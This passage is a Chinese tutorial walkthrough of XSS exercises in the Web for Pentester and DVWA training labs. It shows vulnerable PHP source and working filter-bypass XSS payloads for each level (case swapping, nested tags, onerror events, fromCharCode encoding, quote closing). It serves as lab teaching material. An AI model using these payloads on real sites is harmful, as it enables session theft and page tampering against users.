+<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p><strong>官网</strong>：<a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></p>
+<p><strong>下载地址</strong>：<a href="https://github.com/ethicalhack3r/DVWA/archive/master.zip" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA/archive/master.zip</a></p>
+<p><strong>安装方法</strong>：将<code>/config/config.inc.php.dist</code>文件重命名为<code>/config/config.inc.php</code> ，本地新建一个名字叫做<code>dvwa</code>的数据库，根据本地实际环境的信息，修改配置文件信息如下：（填写key这里是可选的操作）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_user'</span> ]     = <span class="string">'root'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_password'</span> ] = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">'6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">'6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'</span>;</span><br></pre></td></tr></table></figure>
+<p>我本地使用的是<code>PHPStudy</code>搭建的环境，找到<code>PHP扩展及设置</code>-<code>参数开关设置</code>，勾选</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen</span><br><span class="line">allow_url_include</span><br></pre></td></tr></table></figure>
+<p>浏览器访问<code>DVWA</code>的目录来进行安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/setup.php</span><br></pre></td></tr></table></figure>
+<p>点击<code>Create / Reset Databas</code>创建数据库，接着跳转到登录界面。</p>
+<p>默认的账户名为：<strong>admin</strong>，密码为：<strong>password</strong></p>
+<h2 id="XSS小游戏"><a href="#XSS小游戏" class="headerlink" title="XSS小游戏"></a>XSS小游戏</h2><p><strong>项目地址</strong>：<a href="https://github.com/sqlsec/xssgame" target="_blank" rel="noopener">https://github.com/sqlsec/xssgame</a></p>
+<p><strong>安装方法</strong>：直接解压源码到HTTP服务的目录下，浏览器直接访问即可，无需配置数据库等信息</p>
+<h1 id="WebforPentester习题讲解"><a href="#WebforPentester习题讲解" class="headerlink" title="WebforPentester习题讲解"></a>WebforPentester习题讲解</h1><h2 id="第1关-无任何过滤"><a href="#第1关-无任何过滤" class="headerlink" title="第1关 无任何过滤"></a>第1关 无任何过滤</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">echo</span> $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>name变量直接通过GET方式传进去，然后通过echo输出。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="第2关-大小写绕过"><a href="#第2关-大小写绕过" class="headerlink" title="第2关 大小写绕过"></a>第2关 大小写绕过</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $name =  $_GET[&quot;name&quot;];</span><br><span class="line">        $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name);</span><br><span class="line">        $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);</span><br><span class="line">echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用了preg_replace函数来过滤<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签，这里由于正则缺陷，没有考虑到大小写的情况，所以这里可以用大小写转换绕过。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/scripT&gt;</span><br><span class="line"># 也可以双写嵌套</span><br><span class="line">example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/scr&lt;/script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="第3关-嵌套绕过"><a href="#第3关-嵌套绕过" class="headerlink" title="第3关 嵌套绕过"></a>第3关 嵌套绕过</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $name =  $_GET[&quot;name&quot;];</span><br><span class="line">        $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name);</span><br><span class="line">        $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);</span><br><span class="line">echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里在第2关的基础上面，正则规则上面使用了<code>/i</code>，表示不区分大小写，利用这个特点可以构造一个嵌套的标签：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
+<p>被检测到<code>&lt;script&gt;</code>后，替换为了空（即删掉）就变成了一个完整的标签：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&apos;XSS&apos;)&lt;/&lt;/script&gt;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="第4关-其他标签绕过"><a href="#第4关-其他标签绕过" class="headerlink" title="第4关 其他标签绕过"></a>第4关 其他标签绕过</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">if (preg_match(&apos;/script/i&apos;, $_GET[&quot;name&quot;])) &#123;</span><br><span class="line">  die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>对script关键词进行了不区分大小写地过滤，匹配到就直接调用<code>die(&quot;error&quot;)</code>终止程序运行，因此上述的方法就不再适用，但是还可以通过其他许多标签来触发JS事件。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example4.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="第5关-编码或者其他方法绕过"><a href="#第5关-编码或者其他方法绕过" class="headerlink" title="第5关 编码或者其他方法绕过"></a>第5关 编码或者其他方法绕过</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">if (preg_match(&apos;/alert/i&apos;, $_GET[&quot;name&quot;])) &#123;</span><br><span class="line">  die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>对alert关键词进行了不区分大小写地过滤，可以使用其他类似alert的方法来弹窗</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example5.php?name=&lt;script&gt;confirm(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">example5.php?name=&lt;script&gt;prompt(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>也可以通过<code>String.fromCharCode()</code>编码来绕过，使用Hackbar可以很方便地进行编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&apos;XSS&apos;)</span><br></pre></td></tr></table></figure>
+<p>经过String.fromCharCode()编码为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)</span><br></pre></td></tr></table></figure>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="第6关-闭合双引号"><a href="#第6关-闭合双引号" class="headerlink" title="第6关 闭合双引号"></a>第6关 闭合双引号</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var $a= &quot;&lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>通过GET方式传入的name变量，直接输出在了<code>script</code>标签里面，可以尝试闭合前面的双引号<code>&quot;</code>，然后直接调用<code>alert</code>方法来弹窗，末尾再使用双引号<code>&quot;</code>闭合后面的双引号。</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example6.php?name=&quot;;alert(&apos;XSS&apos;);&quot;</span><br></pre></td></tr></table></figure>
+<p>也可以尝试通过<code>//</code>直接注释掉后面的双引号<code>&quot;</code>，这样就不用考虑闭合了：</p>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example6.php?name=&quot;;alert(&apos;XSS&apos;);//</span><br></pre></td></tr></table></figure>
+<h2 id="第7关-闭合单引号"><a href="#第7关-闭合单引号" class="headerlink" title="第7关 闭合单引号"></a>第7关 闭合单引号</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var $a= &apos;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&apos;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>和上一题类似，只是这里的最后是通过<code>htmlentities()</code> 函数把字符转换为 HTML 实体，然后再输出单引号修饰的a变量中。<code>htmlentities()</code>会将双引号<code>&quot;</code> 特殊编码，但是却它不编码单引号<code>&#39;</code>，恰巧这里是通过单引号<code>&#39;</code>给a变量赋值的，所以依然可以通过闭合单引号<code>&#39;</code>来弹窗。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example7.php?name=&apos;;alert(&apos;XSS&apos;);&apos;</span><br><span class="line">example7.php?name=&apos;;alert(&apos;XSS&apos;);//</span><br></pre></td></tr></table></figure>
+<h2 id="第8关-PHP-SELF"><a href="#第8关-PHP-SELF" class="headerlink" title="第8关 PHP_SELF"></a>第8关 PHP_SELF</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">  if (isset($_POST[&quot;name&quot;])) &#123;</span><br><span class="line">    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure>
+<p>name变量通过form表单以POST方式传入，然后通过<code>htmlentities</code>函数是实体化后输出来，这次通过POST方式传入的name变量是比较安全的，暂时无法突破。重点分析这里<code>&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;</code>，用户依然可以控制参数<strong>PHP_SELF</strong> ，并且这里没有过滤直接输入到了<code>form</code>标签中，所以这里通过闭合依然可以XSS。</p>
+<p>闭合引号和标签，通过<code>&lt;script&gt;</code>标签来弹窗：</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example8.php/&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>
+<p>也可以通过闭合引号，通过事件来触发弹窗：</p>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example8.php/&quot; onclick=alert(&apos;XSS&apos;)//</span><br></pre></td></tr></table></figure>
+<h2 id="第9关-location-hash"><a href="#第9关-location-hash" class="headerlink" title="第9关 location.hash"></a>第9关 location.hash</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  document.write(location.hash.substring(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>直接通过<code>location.hash</code>传入参数，然后往网页中写入，这样很不安全，可以直接通过这个属性，往网页中写入JS代码。要了解这个<code>location.hash</code>属性，可以参考W3C的这篇资料：<a href="http://www.w3school.com.cn/jsref/prop_loc_hash.asp" target="_blank" rel="noopener">HTML DOM hash 属性</a></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example9.php#&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>执行完成后，手动刷新下浏览器，经测试在Chrome和FireFox浏览器上的尖括号会被自动转码，在<code>IE</code>内核的浏览器上可以正常运行</p>
+</blockquote>
+<p><img src="http://qiniuyun.lintstar.top/20200804113440.png" alt="20200804113440"></p>
+<h1 id="DVWA习题讲解"><a href="#DVWA习题讲解" class="headerlink" title="DVWA习题讲解"></a>DVWA习题讲解</h1><h2 id="反射-XSS-LOW"><a href="#反射-XSS-LOW" class="headerlink" title="反射 XSS LOW"></a>反射 XSS LOW</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看看到对<code>name</code>变量没有任何的过滤措施，只是单纯的检测了<code>name</code>变量存在并且不为空就直接输出到了网页中。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="反射-XSS-Medium"><a href="#反射-XSS-Medium" class="headerlink" title="反射 XSS Medium"></a>反射 XSS Medium</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只是简单的过滤了<code>&lt;script&gt;</code>标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。</p>
+<p>使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了：</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<p>因为过滤规则的缺陷，这里可以使用嵌套构造来绕过：</p>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的：</p>
+<p><strong>payload3</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="反射-XSS-high"><a href="#反射-XSS-high" class="headerlink" title="反射 XSS high"></a>反射 XSS high</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果：</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="反射-XSS-Impossible"><a href="#反射-XSS-Impossible" class="headerlink" title="反射 XSS Impossible"></a>反射 XSS Impossible</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>name</code>变量通过<code>htmlspecialchars()</code>函数被HTML实体化后输出在了<code>&lt;pre&gt;</code>标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的。</p>
+<blockquote>
+<p><code>$name = htmlspecialchars( $_GET[ &#39;name&#39; ] );</code>这个实体化函数可以修复上面三个级别</p>
+</blockquote>
+<h2 id="DOM-XSS-LOW"><a href="#DOM-XSS-LOW" class="headerlink" title="DOM XSS LOW"></a>DOM XSS LOW</h2><p><strong>源码</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"vulnerable_code_area"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"XSS"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"default"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">                    if (document.location.href.indexOf("default=") &gt;= 0) &#123;</span></span><br><span class="line"><span class="undefined">                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span></span><br><span class="line"><span class="xml">                        document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'" + lang + "'</span>&gt;</span>" + $decodeURI(lang) + "<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                        document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">                    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">                    document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Select"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>DOM XSS是通过修改页面的DOM节点形成的XSS。首先通过选择语言后然后往页面中创建了新的DOM节点：</p>
